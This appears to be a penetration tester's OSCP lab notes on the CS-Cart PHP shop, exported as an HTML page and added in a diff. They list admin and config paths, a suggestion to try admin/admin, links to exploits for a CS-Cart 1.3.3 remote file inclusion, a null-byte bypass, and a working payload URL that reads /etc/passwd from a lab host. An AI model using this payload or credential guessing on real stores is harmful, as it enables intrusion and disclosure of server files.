@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>CS-Cart</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+<body>
+<div class='page'><strong><h1># CS-Cart</h1></strong><br />CS-Cart is an online PHP shop.<br /><br /><strong><h2>## URLs</h2></strong><br />• <code>/admin</code> - Admin panel<br />• <code>/config</code> or <code>/config.php</code> - Config settings (probably can&#39;t access)<br />• <code>/?version</code> - Find running version of CS-Cart<br /><br /><strong><h2>## Credentials</h2></strong><br />• Try <code>admin / admin</code> - worked in oscp PAYDAY<br />• I don&#39;t think the app has any default credentials<br /><br /><strong><h2>## Exploits</h2></strong><br /><strong><h3>### CS-Cart Version 1.3.3 - RFI</h3></strong><br />• <a href="https://www.exploit-db.com/exploits/1872">https://www.exploit-db.com/exploits/1872</a> - <code>classes_dir</code> RFI<br />• <a href="https://github.com/BuddhaLabs/PacketStorm-Exploits/blob/master/0701-exploits/cscart133-rfi.txt">https://github.com/BuddhaLabs/PacketStorm-Exploits/blob/master/0701-exploits/cscart133-rfi.txt</a> - <code>install.php</code> RFI (haven&#39;t tested this one)<br /><br /><strong>#### Potential Errors</strong><br />• Your include gets concatenated with another filename<br />   ◇ e.g. <code>file:////etc/passwdphpmailerDSclass.phpmailer.php</code><br />   ◇ You can bypass this by terminating the string with a null byte<br />      ▪ <code>file:////etc/passwd%00</code><br /><br /><strong>#### Examples</strong><br />• oscp PAYDAY - 10.11.1.24<br /><br /><strong>#### Exploit</strong><br />Read files<br /><code>http://10.11.1.24/classes/phpmailer/class.cs_phpmailer.php?classes_dir=file:////etc/passwd%00</code><br /><br />You could also try getting a shell via RFI (untested).<br /><br /></div>
+</body>
+</html>
